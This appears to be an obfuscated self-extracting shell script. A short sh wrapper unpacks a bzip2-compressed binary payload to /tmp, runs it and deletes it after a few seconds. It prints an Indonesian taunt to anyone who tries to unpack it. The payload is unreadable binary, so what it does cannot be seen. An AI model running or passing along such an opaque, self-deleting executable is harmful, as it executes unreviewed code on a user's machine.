#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�Ç�  ���M����/o�n����    @���	�hC52i��CC&��4 ڌ4F "(h����4  h �@  �M!4�MMM�hژ�h h   �&�521!�Q� =G�C@0�����&3��6�{��M� ��F#��P�Ս�9ۤ�i�c��2@) =�	�Ey��+��J��ɄLpͽ���%O0��'�YJϰ:jʽ�yL.|�@��r6�>v�P�@&�K#��o� ��58�4֯,W~d6�jk��髜x#j��/"(�X��P1�/�pl�S��0_5W���V��M�k�@��A�d&�2���Ҕ��P2�跁�J��s@�2vԺ�}~q!�"Z'i4��q�م[z����01��	%2IR���r����î�`��+w�1	�ñd�BC�&P}D�)푣AH��BN|ٹF��sJ��Q��]JW����ރ@��q\����"���pذ�
U��^�M4.����w�=TtL�F%�0��٘�'D���A��dk�)�l$?T.���eLN�8+dm���b�'�N@�)�����1$���3��62-�:
�E�*��K",���w<�Vh��#F����zT`�=7g�e�:ih�"�{�!�һ%"-�&�PZ���A��@RV�گm�Lɥn8�T>AZ�c
��N|DG����פ�43G8t�	R�a
�
.J�-����%��D#����!���S:A2���3���@�z�g�R���F�Lc�[����3_d�*i3��~�uJ7K"�暉̬�v�-��tD�_�$�BK���"�(Hma�ƀ